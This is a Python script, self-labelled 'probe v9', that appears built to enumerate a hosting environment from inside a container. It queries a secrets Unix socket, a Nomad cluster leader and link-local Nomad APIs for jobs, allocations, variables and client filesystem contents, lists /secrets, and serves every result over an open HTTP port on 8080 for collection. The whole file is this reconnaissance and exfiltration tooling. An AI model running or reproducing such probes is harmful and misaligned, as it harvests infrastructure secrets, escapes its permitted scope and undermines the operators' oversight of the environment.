import http.server
import urllib.request
import json
import os
import socket
import ssl
import subprocess

results = {}

def run_cmd(name, cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
    except Exception as e:
        results[name] = {"error": str(e)}

# 1. PROBE THE UNIX SOCKET /secrets/api.sock
sock_paths = [
    ("sock_root", "/"),
    ("sock_api", "/api/"),
    ("sock_api_overview", "/api/overview"),
    ("sock_api_rawdata", "/api/rawdata"),
    ("sock_api_routers", "/api/http/routers"),
    ("sock_api_middlewares", "/api/http/middlewares"),
    ("sock_api_services", "/api/http/services"),
    ("sock_api_entrypoints", "/api/entrypoints"),
    ("sock_dashboard", "/dashboard/"),
    ("sock_ping", "/ping"),
    ("sock_health", "/health"),
    ("sock_v1_agent", "/v1/agent/self"),
    ("sock_v1_jobs", "/v1/jobs"),
    ("sock_v1_allocs", "/v1/allocations"),
]
for name, path in sock_paths:
    run_cmd(name, f"curl -s --unix-socket /secrets/api.sock 'http://localhost{path}' 2>&1 | head -c 4000")

# 2. NOMAD LEADER DIRECT ACCESS
LEADER = "2a05:d018:1d40:4800:1f92:22bf:5f08:2b17"
leader_eps = ["/v1/agent/self", "/v1/jobs", "/v1/allocations", "/v1/nodes", "/v1/status/leader"]
for ep in leader_eps:
    cname = "leader" + ep.replace("/", "_")
    run_cmd(cname, f"curl -sk -m 5 'https://[{LEADER}]:4646{ep}' 2>&1 | head -c 1000")

# Also try HTTP (not HTTPS) to leader
run_cmd("leader_http", f"curl -s -m 5 'http://[{LEADER}]:4646/v1/status/leader' 2>&1 | head -c 500")

# 3. More Nomad endpoints on local host
LOCAL = "https://169.254.1.2:4646"
more_eps = [
    "/v1/client/stats", "/v1/regions", "/v1/operator/raft/configuration",
    "/v1/agent/host", "/v1/jobs?prefix=", "/v1/allocations?prefix=",
    "/v1/evaluations", "/v1/deployments", "/v1/volumes", "/v1/plugins",
    "/v1/vars", "/v1/var/nomad/jobs",
    "/v1/client/fs/ls/", "/v1/client/fs/cat/",
]
for ep in more_eps:
    cname = "nomad_" + ep.split("?")[0].replace("/", "_").strip("_")
    run_cmd(cname, f"curl -sk -m 3 '{LOCAL}{ep}' 2>&1 | head -c 500")

# 4. Socket details
run_cmd("sock_stat", "stat /secrets/api.sock 2>&1")
run_cmd("ls_secrets", "ls -la /secrets/ 2>&1")

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(results, indent=2, default=str).encode())
    def log_message(self, *args):
        pass

print("Starting probe v9 on port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
